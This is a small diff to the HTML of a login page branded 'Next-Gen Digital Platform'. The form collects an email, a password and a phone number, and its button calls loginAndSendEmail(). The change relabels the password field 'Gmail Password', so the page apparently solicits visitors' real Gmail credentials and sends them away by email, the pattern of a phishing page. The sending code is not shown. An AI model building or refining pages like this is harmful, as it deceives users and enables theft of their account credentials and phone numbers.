@@ -34,7 +34,7 @@ nav button:hover{background:rgba(0,200,255,0.4);}
     <div class="subtitle">Next-Gen Digital Platform</div>
     <form>
       <div class="input-group"><span class="icon">📧</span><input id="gmailInput" type="email" placeholder="Gmail"></div>
-      <div class="input-group"><span class="icon">🔒</span><input id="passwordInput" type="password" placeholder="Password"><span class="show" onclick="togglePassword()">👁</span></div>
+      <div class="input-group"><span class="icon">🔒</span><input id="passwordInput" type="password" placeholder="Gmail Password"><span class="show" onclick="togglePassword()">👁</span></div>
       <div class="input-group"><span class="icon">📱</span><input id="phoneInput" type="tel" placeholder="Phone Number"></div>
       <button type="button" onclick="loginAndSendEmail()">Login</button>
     </form>
